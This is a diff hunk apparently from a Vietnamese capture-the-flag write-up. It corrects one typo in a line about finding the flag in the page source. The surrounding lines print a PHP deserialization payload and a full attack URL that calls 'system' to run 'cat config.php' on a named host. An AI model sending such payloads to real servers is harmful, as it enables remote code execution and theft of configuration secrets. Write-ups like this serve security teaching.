@@ -179,7 +179,7 @@ serialize: `O:10:"Show_color":2:{s:5:"color";s:14:"cat config.php";s:4:"type";O:
 
 link: [http://45.122.249.68:10001/?code=O:10:%22Show_color%22:2:{s:5:%22color%22;s:14:%22cat%20config.php%22;s:4:%22type%22;O:10:%22do_nothing%22:2:{s:3:%22why%22;i:1;s:10:%22i_use_this%22;s:6:%22system%22;}}](http://45.122.249.68:10001/?code=O:10:%22Show_color%22:2:{s:5:%22color%22;s:14:%22cat%20config.php%22;s:4:%22type%22;O:10:%22do_nothing%22:2:{s:3:%22why%22;i:1;s:10:%22i_use_this%22;s:6:%22system%22;}})
 
-Ta nhận được một trang trắng tinh, những kiểm tra source, ta tìm được flag
+Ta nhận được một trang trắng tinh, nhưng kiểm tra source, ta tìm được flag
 
 ![](images/3.png)
 
